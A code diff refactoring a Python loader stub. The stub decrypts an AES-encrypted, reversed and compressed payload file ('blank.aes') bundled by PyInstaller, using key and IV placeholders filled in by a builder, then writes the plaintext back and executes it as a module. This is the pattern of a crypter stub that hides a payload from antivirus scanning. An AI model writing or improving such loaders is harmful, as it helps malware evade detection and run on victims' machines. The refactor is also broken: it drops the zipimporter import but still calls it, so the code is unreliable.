@@ -1,22 +1,28 @@
-import os, sys, base64, zlib
+import os
+import sys
+import base64
+import zlib
 from pyaes import AESModeOfOperationGCM
-from zipimport import zipimporter
+from importlib.util import module_from_spec, spec_from_loader
 
-zipfile = os.path.join(sys._MEIPASS, "blank.aes")
-module = "stub-o"
+zip_file = os.path.join(sys._MEIPASS, "blank.aes")
+module_name = "stub_o"
 
 key = base64.b64decode("%key%")
 iv = base64.b64decode("%iv%")
 
 def decrypt(key, iv, ciphertext):
-    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)
+    aes_cipher = AESModeOfOperationGCM(key, iv)
+    return aes_cipher.decrypt(ciphertext)
 
-if os.path.isfile(zipfile):
-    with open(zipfile, "rb") as f:
-        ciphertext = f.read()
+if os.path.isfile(zip_file):
+    with open(zip_file, "rb") as file:
+        ciphertext = file.read()
     ciphertext = zlib.decompress(ciphertext[::-1])
-    decrypted = decrypt(key, iv, ciphertext)
-    with open(zipfile, "wb") as f:
-        f.write(decrypted)
+    decrypted_data = decrypt(key, iv, ciphertext)
+    with open(zip_file, "wb") as file:
+        file.write(decrypted_data)
     
-    zipimporter(zipfile).load_module(module)
+    spec = spec_from_loader(module_name, zipimporter(zip_file))
+    module = module_from_spec(spec)
+    spec.loader.exec_module(module)
